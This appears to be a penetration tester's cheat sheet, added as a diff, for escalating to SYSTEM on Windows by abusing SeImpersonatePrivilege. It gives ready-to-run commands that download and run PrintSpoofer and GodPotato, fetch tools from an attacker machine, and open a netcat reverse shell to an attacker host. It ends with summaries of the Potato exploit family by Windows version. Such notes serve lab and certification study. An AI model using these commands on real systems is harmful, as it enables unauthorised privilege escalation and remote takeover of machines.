@@ -1,0 +1,54 @@
+# The SeImpersonatePrivilege privilege can potentially be used to escalate privileges.
+# By default, Windows assigns this privilege to members of local Administrators group, LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts.
+# There are multiple exploit tools such as PrintSpoofer, RottenPotato, SweetPotato, JuicyPotato, GodPotato. 
+# Select correct version based on OS and services. See end of document for summary of each method. 
+
+# Method 1 - PrintSpoofer 
+C:\Users\rob> whoami /priv
+kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+C:\Users\rob> powershell
+PS C:\Users\rob> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+PS C:\Users\rob> .\PrintSpoofer64.exe -i -c powershell.exe
+Whoami
+
+# Method 2 - GodPotato
+-Download correct version of GodPotato exe to windows from https://github.com/BeichenDream/GodPotato/releases
+curl https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -o god.exe
+-Execute GodPotato exe file Sample Commands
+C:\Users\rob>god.exe -cmd "cmd /c whoami"
+C:\Users\rob>god.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe kaliIP kaliPort"
+
+
+************************************************************************************************************************************************
+************************************************************************************************************************************************
+************************************************************************************************************************************************
+
+**Exploit: JuicyPotato**  
+- **Service Abused**: COM/RPC (e.g., RPCSS, various CLSIDs like BITS)  
+- **Target Windows Versions**: Windows 7–10 (pre-1809/build ~17134), Server up to 2016  
+- **How It Works (High Level)**: Sets up a fake RPC listener, tricks SYSTEM into connecting via DCOM/RPC, then impersonates the SYSTEM token to execute code as SYSTEM  
+- **Notes / Limitations / Current Status**: Early and most famous Potato exploit; patched in Windows 10 1809+ / Server 2019+ due to DCOM hardening and restrictions on local NTLM reflection. No longer reliable on modern, patched builds.
+
+**Exploit: RoguePotato**  
+- **Service Abused**: COM/OXID Resolver / DCOM  
+- **Target Windows Versions**: Windows 7–10 / Server 2019 (some builds)  
+- **How It Works (High Level)**: Similar to JuicyPotato but uses a different COM interface and forces remote OXID resolution (often requires a network redirector like socat on TCP/135) for more reliable triggering  
+- **Notes / Limitations / Current Status**: Requires local network connection/redirector in many cases; more reliable than JuicyPotato on some patched builds, but still limited by later DCOM changes. Less commonly used today.
+
+**Exploit: RottenPotato (incl. RottenPotatoNG)**  
+- **Service Abused**: SMB/COM (often BITS service NTLM relay)  
+- **Target Windows Versions**: Windows 7–10 (early builds)  
+- **How It Works (High Level)**: Exploits weak token validation via SMB & COM to impersonate SYSTEM (original version used BITS NTLM relay)  
+- **Notes / Limitations / Current Status**: Faster in some scenarios; works where JuicyPotato fails on certain builds, but largely patched/blocked on latest Windows versions due to DCOM/SMB hardening. Considered deprecated/ineffective on modern systems.
+
+**Exploit: GodPotato**  
+- **Service Abused**: COM/DCOM (RPCSS OXID handling flaws)  
+- **Target Windows Versions**: Windows 10 latest builds / Server 2019/2022/2025 (broad support)  
+- **How It Works (High Level)**: Modernized Potato variant; exploits RPCSS/DCOM OXID resolution defects and bypasses session isolation/DCOM hardening to impersonate SYSTEM  
+- **Notes / Limitations / Current Status**: Works on many latest patched Windows versions (including recent Server builds); more complex setup but excellent compatibility. Still active and one of the best current options in 2025–2026 when SeImpersonatePrivilege is present (forks like SigmaPotato add features such as in-memory execution and reverse shells).
+
+**Exploit: PrintSpoofer**  
+- **Service Abused**: Print Spooler service (spoolss RPC/named pipe)  
+- **Target Windows Versions**: Windows 7–10 / Server 2008 R2–2019/2022 (where Print Spooler is running)  
+- **How It Works (High Level)**: Tricks the Print Spooler into running arbitrary code as SYSTEM via named pipe impersonation and RPC coercion  
+- **Notes / Limitations / Current Status**: Reliable on many versions even after JuicyPotato patches; requires the Print Spooler service to be running and accessible locally. Frequently disabled in hardened environments (post-PrintNightmare mitigations), but still works if the service is enabled.
